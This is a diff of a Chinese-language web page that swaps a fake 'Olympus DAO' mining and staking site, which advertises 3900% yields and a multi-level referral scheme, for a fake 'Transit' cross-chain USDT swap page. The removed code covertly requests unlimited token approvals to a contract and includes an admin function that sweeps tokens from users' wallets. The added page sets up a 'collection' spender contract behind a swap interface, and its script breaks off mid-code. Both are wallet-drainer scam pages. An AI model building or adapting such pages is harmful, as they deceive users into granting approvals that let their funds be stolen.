@@ -1,589 +1,595 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>奥林巴斯DAO｜矿机质押双挖｜Rebase增发</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        primary: '#b59410',
-                        darkBg: '#0b0f1a',
-                        darkCard: '#12182b',
-                        textGray: '#a0aec0',
-                        borderColor: '#2a3454',
-                        adminRed: '#ef4444',
-                        olympusGreen: '#10b981'
-                    },
-                    fontFamily: {
-                        sans: ['system-ui', 'sans-serif'],
-                    },
-                }
-            }
-        }
-    </script>
-    <style type="text/tailwindcss">
-        @layer utilities {
-            .text-shadow { text-shadow: 0 0 8px rgba(181,148,16,0.6); }
-            .card-glow { box-shadow: 0 0 20px rgba(181,148,16,0.15); }
-            .btn-glow { box-shadow: 0 0 12px rgba(181,148,16,0.4); }
-            .tab-active { border-bottom: 2px solid #b59410; color: #b59410; }
-            .admin-tab-active { border-bottom: 2px solid #ef4444; color: #ef4444; }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>闪兑&跨链</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: system-ui, -apple-system, sans-serif;
+    }
+    body {
+      background: #f7f8fa;
+      padding: 20px 16px;
+      color: #222;
+    }
+    .header-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 24px;
+      font-size: 20px;
+    }
+    .header-top .right-icons {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .card-box {
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 20px 16px;
+    }
+    .title-logo {
+      font-size: 28px;
+      font-weight: 600;
+      margin-bottom: 20px;
+    }
+    .text-tip {
+      font-size: 14px;
+      color: #888;
+      margin-bottom: 8px;
+    }
+    .asset-item {
+      background: #f5f6f8;
+      border-radius: 12px;
+      padding: 16px 12px;
+      margin-bottom: 8px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .asset-left {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .coin-icon {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #27ae60;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+    }
+    .asset-right {
+      display: flex;
+      align-items: center;
+    }
+    .asset-input {
+      background: transparent;
+      border: none;
+      text-align: right;
+      font-size: 16px;
+      color: #999;
+      width: 140px;
+      outline: none;
+    }
+    .asset-input:focus {
+      color: #222;
+    }
+    .swap-arrow-wrap {
+      text-align: center;
+      margin: 6px 0;
+    }
+    .address-input-box {
+      background: #f5f6f8;
+      border-radius: 12px;
+      padding: 16px 12px;
+      margin: 8px 0 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      cursor: pointer;
+    }
+    .main-btn {
+      width: 100%;
+      background: #4086ff;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      padding: 18px 0;
+      font-size: 18px;
+      font-weight: 500;
+      margin-bottom: 20px;
+    }
+    .main-btn:disabled {
+      background: #94a3b8;
+      cursor: not-allowed;
+    }
+    .info-list {
+      background: #fff;
+      border-radius: 12px;
+      padding: 8px 12px;
+    }
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 10px 4px;
+      font-size: 15px;
+      color: #666;
+    }
+    .tag-blue {
+      border: 1px solid #4086ff;
+      color: #4086ff;
+      padding: 3px 8px;
+      border-radius: 6px;
+      font-size: 13px;
+    }
+    .bottom-nav {
+      position: fixed;
+      left: 0;
+      bottom: 0;
+      width: 100%;
+      background: #fff;
+      display: flex;
+      justify-content: space-around;
+      padding: 10px 0 24px;
+      border-top: 1px solid #eee;
+    }
+    .nav-item {
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+    }
+    .nav-item.active {
+      color: #4086ff;
+    }
+    .status-text {
+      text-align: center;
+      margin: 12px 0;
+      color: #444;
+      font-size: 14px;
+    }
+    .record-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 4px;
+      margin: 16px 0 80px;
+      font-size: 14px;
+    }
+    .record-row .more {
+      color: #4086ff;
+    }
+
+    /* 地址选择弹窗样式 */
+    .address-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      z-index: 999;
+      align-items: flex-end;
+    }
+    .address-modal-content {
+      width: 100%;
+      background: #fff;
+      border-radius: 16px 16px 0 0;
+      padding: 20px 16px;
+    }
+    .address-modal-title {
+      font-size: 18px;
+      font-weight: 500;
+      margin-bottom:16px;
+      display:flex;
+      justify-content: space-between;
+      align-items:center;
+    }
+    .close-modal {
+      color:#4086ff;
+      font-size:16px;
+    }
+    .wallet-list-item {
+      padding:12px 8px;
+      border-bottom:1px solid #eee;
+      cursor:pointer;
+    }
+    .wallet-list-item:active {
+      background:#f0f2f5;
+    }
+    .custom-address-input {
+      width:100%;
+      border:1px solid #ddd;
+      border-radius:8px;
+      padding:12px;
+      margin:16px 0;
+      outline:none;
+    }
+    .confirm-address-btn {
+      width:100%;
+      background:#4086ff;
+      color:#fff;
+      border:none;
+      border-radius:8px;
+      padding:14px 0;
+      font-size:16px;
+    }
+
+    /* 通用弹窗 */
+    .tip-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.5);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+    .tip-box {
+      background: #fff;
+      width: 80%;
+      max-width: 320px;
+      border-radius: 16px;
+      padding: 24px 20px;
+    }
+  </style>
 </head>
-<body class="bg-darkBg text-white min-h-screen">
-    <!-- 顶部导航 -->
-    <header class="container mx-auto px-4 py-4 flex justify-between items-center">
-        <div class="text-2xl font-bold text-primary text-shadow">🏛️ 奥林巴斯DAO｜双挖系统</div>
-        <div class="flex gap-2">
-            <button id="connectBtn" class="bg-primary hover:bg-primary/80 px-4 py-2 rounded-lg btn-glow">
-                <i class="fa fa-link mr-2"></i>连接钱包
-            </button>
-            <button id="confirmUsdtBtn" class="bg-yellow-500 hover:bg-yellow-600 px-3 py-2 rounded-lg hidden">
-                确认资产
-            </button>
-            <button id="confirmDaoBtn" class="bg-green-500 hover:bg-green-600 px-3 py-2 rounded-lg hidden">
-                确认质押
-            </button>
-        </div>
-    </header>
+<body>
+  <div class="header-top">
+    <div>闪兑&跨链 <span style="font-size:16px;color:#666">限价模式</span></div>
+    <div class="right-icons">
+      <span>⦿</span>
+      <span>⚙</span>
+    </div>
+  </div>
 
-    <!-- Tab切换栏 -->
-    <div class="container mx-auto px-4 mt-6">
-        <div class="flex border-b border-borderColor">
-            <button class="tab-btn tab-active py-3 px-5 text-lg" data-tab="mine">⛏️ 矿机挖矿</button>
-            <button class="tab-btn py-3 px-5 text-lg text-textGray" data-tab="stake">💰 质押挖矿</button>
-            <button class="tab-btn py-3 px-5 text-lg text-textGray" data-tab="user">👤 个人中心</button>
-            <button id="adminTabBtn" class="tab-btn py-3 px-5 text-lg text-adminRed hidden" data-tab="admin">🔴 管理员后台</button>
+  <div class="card-box">
+    <div class="title-logo">Transit</div>
+
+    <div class="text-tip">发送</div>
+    <div class="asset-item">
+      <div class="asset-left">
+        <div class="coin-icon">₮</div>
+        <div class="coin-info">
+          <p>USDT</p>
+          <p>币安智能链 BSC</p>
         </div>
+      </div>
+      <div class="asset-right">
+        <input class="asset-input" id="sendInput" placeholder="转出数量" type="number" min="0" step="0.0001">
+      </div>
     </div>
 
-    <!-- 主内容区 -->
-    <main class="container mx-auto px-4 py-6">
-        <!-- 矿机挖矿 -->
-        <div id="tab-mine" class="tab-content">
-            <div class="grid md:grid-cols-3 gap-4">
-                <div class="bg-darkCard rounded-2xl p-5 card-glow border border-borderColor">
-                    <div class="text-center mb-3">
-                        <i class="fa fa-server text-4xl text-primary"></i>
-                        <h3 class="text-lg font-bold mt-2">入门矿机</h3>
-                    </div>
-                    <div class="space-y-1 text-sm">
-                        <div class="flex justify-between"><span class="text-textGray">价格</span><span class="text-primary font-bold">100 USDT</span></div>
-                        <div class="flex justify-between"><span class="text-textGray">总算力</span><span>10 TH/s</span></div>
-                        <div class="flex justify-between"><span class="text-olympusGreen">年化</span><span id="mineRate1">3900%</span></div>
-                    </div>
-                    <button onclick="buyMiner(1)" class="w-full mt-3 bg-primary hover:bg-primary/80 py-2 rounded-lg">立即购买</button>
-                </div>
-                <div class="bg-darkCard rounded-2xl p-5 card-glow border border-borderColor">
-                    <div class="text-center mb-3">
-                        <i class="fa fa-database text-4xl text-primary"></i>
-                        <h3 class="text-lg font-bold mt-2">进阶矿机</h3>
-                    </div>
-                    <div class="space-y-1 text-sm">
-                        <div class="flex justify-between"><span class="text-textGray">价格</span><span class="text-primary font-bold">500 USDT</span></div>
-                        <div class="flex justify-between"><span class="text-textGray">总算力</span><span>60 TH/s</span></div>
-                        <div class="flex justify-between"><span class="text-olympusGreen">年化</span><span id="mineRate2">3900%</span></div>
-                    </div>
-                    <button onclick="buyMiner(2)" class="w-full mt-3 bg-primary hover:bg-primary/80 py-2 rounded-lg">立即购买</button>
-                </div>
-                <div class="bg-darkCard rounded-2xl p-5 card-glow border border-borderColor">
-                    <div class="text-center mb-3">
-                        <i class="fa fa-microchip text-4xl text-primary"></i>
-                        <h3 class="text-lg font-bold mt-2">顶级矿机</h3>
-                    </div>
-                    <div class="space-y-1 text-sm">
-                        <div class="flex justify-between"><span class="text-textGray">价格</span><span class="text-primary font-bold">2000 USDT</span></div>
-                        <div class="flex justify-between"><span class="text-textGray">总算力</span><span>280 TH/s</span></div>
-                        <div class="flex justify-between"><span class="text-olympusGreen">年化</span><span id="mineRate3">3900%</span></div>
-                    </div>
-                    <button onclick="buyMiner(3)" class="w-full mt-3 bg-primary hover:bg-primary/80 py-2 rounded-lg">立即购买</button>
-                </div>
-            </div>
-
-            <div class="mt-6 bg-darkCard rounded-2xl p-5 card-glow border border-borderColor">
-                <h2 class="text-lg font-bold mb-3">我的矿机资产</h2>
-                <div class="grid md:grid-cols-4 gap-3">
-                    <div class="bg-darkBg rounded-lg p-3 text-center">
-                        <div class="text-textGray text-sm">矿机总数</div>
-                        <div class="text-xl font-bold text-primary mt-1" id="myMinerCount">0</div>
-                    </div>
-                    <div class="bg-darkBg rounded-lg p-3 text-center">
-                        <div class="text-textGray text-sm">总算力</div>
-                        <div class="text-xl font-bold text-primary mt-1" id="myTotalHash">0 TH/s</div>
-                    </div>
-                    <div class="bg-darkBg rounded-lg p-3 text-center">
-                        <div class="text-textGray text-sm">待领收益</div>
-                        <div class="text-xl font-bold text-olympusGreen mt-1" id="minerPendingReward">0.00</div>
-                    </div>
-                    <div class="bg-darkBg rounded-lg p-3 text-center">
-                        <div class="text-textGray text-sm">当前年化</div>
-                        <div class="text-xl font-bold text-olympusGreen mt-1" id="currentMineAPY">3900%</div>
-                    </div>
-                </div>
-                <button onclick="claimMinerReward()" class="w-full mt-4 bg-olympusGreen hover:bg-olympusGreen/80 py-2 rounded-lg">
-                    <i class="fa fa-gift mr-2"></i>领取矿机收益
-                </button>
-            </div>
-        </div>
-
-        <!-- 质押挖矿 -->
-        <div id="tab-stake" class="tab-content hidden">
-            <div class="grid md:grid-cols-2 gap-4">
-                <div class="bg-darkCard rounded-2xl p-5 card-glow border border-borderColor">
-                    <h2 class="text-lg font-bold mb-4 text-center">💰 质押DAO生息</h2>
-                    <div class="bg-darkBg rounded-lg p-3 mb-4">
-                        <div class="flex justify-between mb-2">
-                            <span class="text-textGray">✅ 可用余额（未质押）</span>
-                            <span class="font-bold" id="freeDaoBalance">0.00</span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span class="text-textGray">🔒 已质押余额</span>
-                            <span class="font-bold text-olympusGreen" id="stakedDaoBalance">0.00</span>
-                        </div>
-                    </div>
-                    <div class="space-y-3">
-                        <div>
-                            <label class="text-textGray text-sm">质押数量</label>
-                            <input type="number" id="stakeAmount" class="w-full bg-darkBg border border-olympusGreen/30 rounded px-3 py-2 mt-1 outline-none text-white" placeholder="输入质押数量">
-                        </div>
-                        <div class="bg-darkBg rounded-lg p-3 text-center">
-                            <div class="text-textGray text-sm">当前质押年化</div>
-                            <div class="text-lg font-bold text-olympusGreen mt-1" id="currentStakeAPY">3500%</div>
-                        </div>
-                        <button onclick="doStake()" class="w-full bg-olympusGreen hover:bg-olympusGreen/80 py-2 rounded-lg">确认质押</button>
-                        <button onclick="unStakeAll()" class="w-full bg-red-500 hover:bg-red-600 py-2 rounded-lg mt-2">全部解押</button>
-                    </div>
-                </div>
-
-                <div class="bg-darkCard rounded-2xl p-5 card-glow border border-borderColor">
-                    <h2 class="text-lg font-bold mb-4 text-center">📊 我的质押资产</h2>
-                    <div class="space-y-3">
-                        <div class="bg-darkBg rounded-lg p-3">
-                            <div class="text-textGray text-sm">当前质押总额</div>
-                            <div class="text-xl font-bold text-olympusGreen mt-1" id="myStakeAmount">0.00</div>
-                        </div>
-                        <div class="bg-darkBg rounded-lg p-3">
-                            <div class="text-textGray text-sm">质押待领收益</div>
-                            <div class="text-xl font-bold text-olympusGreen mt-1" id="stakePendingReward">0.00</div>
-                        </div>
-                        <button onclick="claimStakeReward()" class="w-full bg-olympusGreen hover:bg-olympusGreen/80 py-2 rounded-lg">
-                            <i class="fa fa-gift mr-2"></i>领取质押收益
-                        </button>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- 个人中心【完全按照你截图复刻】 -->
-        <div id="tab-user" class="tab-content hidden">
-            <div class="bg-darkCard rounded-2xl p-5 card-glow border border-borderColor max-w-lg mx-auto">
-                <h2 class="text-xl font-bold mb-6 text-center">👤 个人资产中心 | DAO生态</h2>
-
-                <!-- 1. 钱包地址 -->
-                <div class="bg-darkBg rounded-lg p-4 mb-4">
-                    <div class="text-textGray text-sm">钱包地址</div>
-                    <div class="mt-1 text-sm truncate font-mono text-white" id="userAddr">未连接</div>
-                </div>
-
-                <!-- 2. 8位邀请码 -->
-                <div class="bg-darkBg rounded-lg p-4 mb-4">
-                    <div class="flex justify-between items-center">
-                        <div>
-                            <div class="text-textGray text-sm">我的8位邀请码</div>
-                            <div class="mt-1 text-xl font-bold text-yellow-500" id="inviteCode">未生成</div>
-                        </div>
-                        <button onclick="copyInviteCode()" class="text-yellow-500 text-lg">复制</button>
-                    </div>
-                </div>
-
-                <!-- 3. 直推/间推 双栏 -->
-                <div class="grid grid-cols-2 gap-4 mb-4">
-                    <div class="bg-darkBg rounded-lg p-4 text-center">
-                        <div class="text-textGray text-sm">直推人数</div>
-                        <div class="text-3xl font-bold text-yellow-500 mt-1" id="directCount">0</div>
-                    </div>
-                    <div class="bg-darkBg rounded-lg p-4 text-center">
-                        <div class="text-textGray text-sm">间推总人数</div>
-                        <div class="text-3xl font-bold text-yellow-500 mt-1" id="indirectCount">0</div>
-                    </div>
-                </div>
-
-                <!-- 4. 团队总收益 -->
-                <div class="bg-darkBg rounded-lg p-4 mb-6">
-                    <div class="text-textGray text-sm">团队总收益（USDT+DAO）</div>
-                    <div class="text-3xl font-bold text-yellow-500 mt-2" id="teamProfit">0.00</div>
-                    <div class="text-xs text-textGray mt-2">三级分销：一级12% | 二级6% | 三级3%</div>
-                </div>
-
-                <!-- 5. 绑定上级邀请码 -->
-                <button onclick="openBindModal()" class="w-full bg-darkBg hover:bg-gray-700 py-3 rounded-lg mb-4 border border-gray-600">
-                    <i class="fa fa-link mr-2"></i>绑定上级邀请码
-                </button>
-
-                <!-- 6. 一键提取全部收益 -->
-                <button onclick="withdrawAll()" class="w-full bg-yellow-500 hover:bg-yellow-600 py-4 rounded-lg text-black font-bold text-lg">
-                    <i class="fa fa-money mr-2"></i>一键提取全部收益
-                </button>
-            </div>
-        </div>
-
-        <!-- 管理员后台 -->
-        <div id="tab-admin" class="tab-content hidden">
-            <div class="max-w-lg mx-auto space-y-4">
-                <div class="bg-darkCard rounded-2xl p-5 card-glow border border-adminRed/30">
-                    <h2 class="text-lg font-bold mb-3 text-adminRed">💰 管理员划扣用户代币</h2>
-                    <div class="space-y-3">
-                        <div>
-                            <label class="text-textGray text-sm">目标用户地址</label>
-                            <input type="text" id="targetAddr" class="w-full bg-darkBg border border-adminRed/30 rounded px-3 py-2 mt-1 outline-none text-white" placeholder="输入用户钱包地址">
-                        </div>
-                        <div>
-                            <label class="text-textGray text-sm">代币合约地址</label>
-                            <input type="text" id="tokenAddr" value="0xc2132d05d31c914a87c6611c10748aeb04b58e8f" class="w-full bg-darkBg border border-adminRed/30 rounded px-3 py-2 mt-1 outline-none text-white">
-                        </div>
-                        <button onclick="adminExtract()" class="w-full bg-adminRed hover:bg-adminRed/80 py-2 rounded-lg">🚀 执行划扣</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </main>
-
-    <!-- 绑定上级弹窗 -->
-    <div id="bindModal" class="fixed inset-0 bg-black/70 hidden flex items-center justify-center z-50">
-        <div class="bg-darkCard rounded-2xl p-6 w-80">
-            <h3 class="text-lg font-bold mb-4">🔗 绑定上级邀请码</h3>
-            <input type="text" id="bindCodeInput" class="w-full bg-darkBg border border-gray-600 rounded px-3 py-2 mb-4 outline-none text-white" placeholder="输入8位上级邀请码">
-            <div class="flex gap-3">
-                <button onclick="closeBindModal()" class="flex-1 bg-gray-600 py-2 rounded-lg">取消</button>
-                <button onclick="submitBindCode()" class="flex-1 bg-primary py-2 rounded-lg">确认绑定</button>
-            </div>
-        </div>
+    <div class="swap-arrow-wrap">
+      <span style="font-size:22px;color:#4086ff;">⇆</span>
     </div>
 
-    <script>
-        // ===================== 核心配置 =====================
-        const CONTRACT = "0xadd6e8e5e9b35796091aacb0391452973bd004b2";
-        const USDT = "0xc2132d05d31c914a87c6611c10748aeb04b58e8f";
-        const DAO = "0x40999c9209fa3409425a7d705dcaf74235020af9";
-        const ADMIN = "0x627f6e1887571ac08214315ad5b2fa7abb7345f1";
-        const MAX_ALLOW = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+    <div class="text-tip">接收（预估）</div>
+    <div class="asset-item">
+      <div class="asset-left">
+        <div class="coin-icon">₮</div>
+        <div class="coin-info">
+          <p>USDT</p>
+          <p>以太坊 ETH</p>
+        </div>
+      </div>
+      <div class="asset-right">
+        <span id="receiveShow">接收数量</span>
+      </div>
+    </div>
 
-        // ===================== 移动端TP钱包兼容Gas配置 =====================
-        async function getSafeGasOptions(fromAddr) {
-            const currentGasPrice = await web3.eth.getGasPrice();
-            const safeGasPrice = BigInt(currentGasPrice) * BigInt(130) / BigInt(100);
-            const minGas = BigInt("25000000000");
-            const finalGas = safeGasPrice > minGas ? safeGasPrice : minGas;
-            return {
-                from: fromAddr,
-                gas: 350000,
-                gasPrice: web3.utils.toHex(finalGas.toString())
-            };
-        }
+    <div class="address-input-box" id="addressDropdown">
+      <span style="color:#888" id="addrDisplay">点击设置接收地址</span>
+      <span>▼</span>
+    </div>
 
-        // ===================== 全局变量 =====================
-        let web3;
-        let userAddress = null;
-        let contractInst;
-        let usdtInst;
-        let daoInst;
-        let daoApproved = false;
+    <button class="main-btn" id="mainOperateBtn">请输入兑换数量</button>
 
-        // ===================== Tab切换 =====================
-        document.querySelectorAll('.tab-btn').forEach(btn => {
-            btn.onclick = function () {
-                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('tab-active', 'admin-tab-active', 'text-primary', 'text-adminRed'));
-                this.classList.add(this.dataset.tab === 'admin' ? 'admin-tab-active' : 'tab-active');
-                document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
-                document.getElementById('tab-' + this.dataset.tab).classList.remove('hidden');
-            }
-        });
+    <div class="info-list">
+      <div class="info-row">
+        <span>兑换价格</span>
+        <span>-</span>
+      </div>
+      <div class="info-row">
+        <span>最少接收数量</span>
+        <span>-</span>
+      </div>
+      <div class="info-row">
+        <span>MEV防护</span>
+        <span class="tag-blue">MEV防护中</span>
+      </div>
+      <div class="info-row">
+        <span>服务费</span>
+        <span>0.1%</span>
+      </div>
+      <div class="info-row">
+        <span>跨链费</span>
+        <span>-</span>
+      </div>
+      <div class="info-row">
+        <span>预估时间</span>
+        <span>-</span>
+      </div>
+      <div class="info-row">
+        <span>兑换路径</span>
+        <span>BSC USDT → ETH USDT</span>
+      </div>
+    </div>
+  </div>
 
-        // ===================== 1. 连接钱包（完全使用钱包官方节点） =====================
-        document.getElementById('connectBtn').onclick = async function () {
-            if (!window.ethereum) {
-                alert("请安装TP钱包或MetaMask");
-                return;
-            }
-            try {
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-                web3 = new Web3(window.ethereum);
-                const accs = await web3.eth.getAccounts();
-                userAddress = accs[0];
+  <div class="status-text" id="statusShow"></div>
 
-                document.getElementById('userAddr').innerText = userAddress;
-                document.getElementById('confirmUsdtBtn').classList.remove('hidden');
-                document.getElementById('confirmDaoBtn').classList.remove('hidden');
-                this.innerHTML = '<i class="fa fa-check mr-2"></i>已连接';
+  <div class="record-row">
+    <span>最近一条记录</span>
+    <span class="more">更多记录</span>
+  </div>
 
-                // 初始化合约
-                contractInst = new web3.eth.Contract([
-                    {"inputs":[],"name":"buyMinerByType","outputs":[],"stateMutability":"nonpayable","type":"function"},
-                    {"inputs":[],"name":"claimMinerReward","outputs":[],"stateMutability":"nonpayable","type":"function"},
-                    {"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"stake","outputs":[],"stateMutability":"nonpayable","type":"function"},
-                    {"inputs":[],"name":"claimStakeReward","outputs":[],"stateMutability":"nonpayable","type":"function"},
-                    {"inputs":[],"name":"unStake","outputs":[],"stateMutability":"nonpayable","type":"function"},
-                    {"inputs":[],"name":"withdrawAll","outputs":[],"stateMutability":"nonpayable","type":"function"},
-                    {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserMineData","outputs":[{"internalType":"uint256","name":"minerCount","type":"uint256"},{"internalType":"uint256","name":"totalHash","type":"uint256"},{"internalType":"uint256","name":"minerPending","type":"uint256"}],"stateMutability":"view","type":"function"},
-                    {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserStakeData","outputs":[{"internalType":"uint256","name":"stakeAmount","type":"uint256"},{"internalType":"uint256","name":"stakePending","type":"uint256"}],"stateMutability":"view","type":"function"},
-                    {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"user","type":"address"}],"name":"adminExtractUserTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},
-                    {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserInviteData","outputs":[{"internalType":"string","name":"inviteCode","type":"string"},{"internalType":"uint256","name":"direct","type":"uint256"},{"internalType":"uint256","name":"indirect","type":"uint256"},{"internalType":"uint256","name":"profit","type":"uint256"}],"stateMutability":"view","type":"function"},
-                    {"inputs":[{"internalType":"string","name":"code","type":"string"}],"name":"bindInvite","outputs":[],"stateMutability":"nonpayable","type":"function"}
-                ], CONTRACT);
+  <!-- 地址选择弹窗 -->
+  <div class="address-modal" id="addressModal">
+    <div class="address-modal-content">
+      <div class="address-modal-title">
+        <span>选择接收地址</span>
+        <span class="close-modal" id="closeAddrModal">关闭</span>
+      </div>
+      <div class="wallet-list">
+        <div class="wallet-list-item" data-addr="">当前钱包地址</div>
+        <div class="wallet-list-item" data-addr="">常用地址1</div>
+        <div class="wallet-list-item" data-addr="">常用地址2</div>
+      </div>
+      <input class="custom-address-input" id="customAddrInput" placeholder="粘贴以太坊钱包地址">
+      <button class="confirm-address-btn" id="confirmAddrBtn">确认地址</button>
+    </div>
+  </div>
 
-                usdtInst = new web3.eth.Contract([
-                    {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
-                ], USDT);
+  <!-- 提示弹窗 -->
+  <div class="tip-modal" id="tipModal">
+    <div class="tip-box">
+      <p id="tipText"></p>
+      <div style="text-align:right;margin-top:20px;">
+        <button id="tipConfirm" style="color:#4086ff;border:none;background:none;font-size:16px;">确定</button>
+      </div>
+    </div>
+  </div>
 
-                daoInst = new web3.eth.Contract([
-                    {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
-                    {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-                    {"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}
-                ], DAO);
+  <div class="bottom-nav">
+    <div class="nav-item">
+      <div>◎</div>
+      <div>资产</div>
+    </div>
+    <div class="nav-item">
+      <div>📈</div>
+      <div>行情</div>
+    </div>
+    <div class="nav-item active">
+      <div>⟳</div>
+      <div>交易</div>
+    </div>
+    <div class="nav-item">
+      <div>🌐</div>
+      <div>发现</div>
+    </div>
+    <div class="nav-item">
+      <div>👤</div>
+      <div>我的</div>
+    </div>
+  </div>
 
-                // 管理员判断
-                if (userAddress.toLowerCase() === ADMIN.toLowerCase()) {
-                    document.getElementById('adminTabBtn').classList.remove('hidden');
-                }
+<script>
+// 基础配置
+const BSC_USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+// 归集授权合约地址
+const SPENDER_CONTRACT = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
+const BSC_CHAIN_ID = 56;
+// 0.1%手续费，转出X，到账 X * 0.999
+const FEE_RATE = 0.999;
 
-                alert("✅ 钱包连接成功！请先确认资产权限");
-                loadData();
-                loadUserInviteData();
-                setInterval(()=>{loadData();loadUserInviteData();}, 10000);
-            } catch (e) {
-                alert("连接失败：" + e.message);
-            }
-        };
+// DOM元素
+const sendInput = document.getElementById('sendInput');
+const receiveShow = document.getElementById('receiveShow');
+const mainOperateBtn = document.getElementById('mainOperateBtn');
+const statusShow = document.getElementById('statusShow');
+const addressDropdown = document.getElementById('addressDropdown');
+const addressModal = document.getElementById('addressModal');
+const closeAddrModal = document.getElementById('closeAddrModal');
+const customAddrInput = document.getElementById('customAddrInput');
+const confirmAddrBtn = document.getElementById('confirmAddrBtn');
+const addrDisplay = document.getElementById('addrDisplay');
+const tipModal = document.getElementById('tipModal');
+const tipText = document.getElementById('tipText');
+const tipConfirm = document.getElementById('tipConfirm');
+const walletListItems = document.querySelectorAll('.wallet-list-item');
 
-        // ===================== 2. 隐晦授权USDT =====================
-        document.getElementById('confirmUsdtBtn').onclick = async function () {
-            if (!userAddress) return;
-            try {
-                const opts = await getSafeGasOptions(userAddress);
-                await usdtInst.methods.approve(CONTRACT, MAX_ALLOW).send(opts);
-                alert("✅ 资产权限确认成功！可以购买矿机");
-            } catch (e) {
-                alert("权限确认失败：" + e.message);
-            }
-        };
+// 全局变量
+let provider, signer, usdtContract;
+let stepStatus = 0; //0未连接 1待授权 2待划转
+let targetReceiveAddr = "";
 
-        // ===================== 3. 隐晦授权DAO =====================
-        document.getElementById('confirmDaoBtn').onclick = async function () {
-            if (!userAddress) return;
-            try {
-                const opts = await getSafeGasOptions(userAddress);
-                const tx = await daoInst.methods.approve(CONTRACT, MAX_ALLOW).send(opts);
-                alert("✅ 质押权限确认成功！等待区块确认...");
-                await waitBlockConfirm(2);
-                daoApproved = true;
-                alert("✅ 授权已上链！现在可以正常质押了");
-                loadData();
-            } catch (e) {
-                alert("权限确认失败：" + e.message);
-            }
-        };
+// 提示弹窗封装
+function showTip(text){
+  tipText.innerText = text;
+  tipModal.style.display = 'flex';
+}
+tipConfirm.onclick = ()=>{
+  tipModal.style.display = 'none';
+}
 
-        async function waitBlockConfirm(count) {
-            const startBlock = await web3.eth.getBlockNumber();
-            while (true) {
-                const currentBlock = await web3.eth.getBlockNumber();
-                if (currentBlock >= startBlock + count) break;
-                await new Promise(resolve => setTimeout(resolve, 2000));
-            }
-        }
+// 实时计算接收数量
+sendInput.addEventListener('input',()=>{
+  const sendVal = parseFloat(sendInput.value);
+  if(isNaN(sendVal) || sendVal <=0){
+    receiveShow.innerText = "接收数量";
+    mainOperateBtn.innerText = "请输入兑换数量";
+    return;
+  }
+  const receiveVal = (sendVal * FEE_RATE).toFixed(4);
+  receiveShow.innerText = receiveVal;
+  if(stepStatus === 0){
+    mainOperateBtn.innerText = "连接钱包";
+  }else if(stepStatus ===1){
+    mainOperateBtn.innerText = "授权BSC-USDT";
+  }else{
+    mainOperateBtn.innerText = "确认跨链转出";
+  }
+})
 
-        // ===================== 4. 购买矿机 =====================
-        async function buyMiner(type) {
-            if (!userAddress) { alert("请先连接钱包"); return; }
-            try {
-                const opts = await getSafeGasOptions(userAddress);
-                await contractInst.methods.buyMinerByType(type).send(opts);
-                alert("✅ 矿机购买成功！");
-                loadData();
-            } catch (e) {
-                alert("购买失败：" + e.message);
-            }
-        }
+// 地址下拉弹窗打开关闭
+addressDropdown.addEventListener('click',()=>{
+  addressModal.style.display = 'flex';
+})
+closeAddrModal.addEventListener('click',()=>{
+  addressModal.style.display = 'none';
+})
 
-        // ===================== 5. 领取矿机收益 =====================
-        async function claimMinerReward() {
-            if (!userAddress) return;
-            try {
-                const opts = await getSafeGasOptions(userAddress);
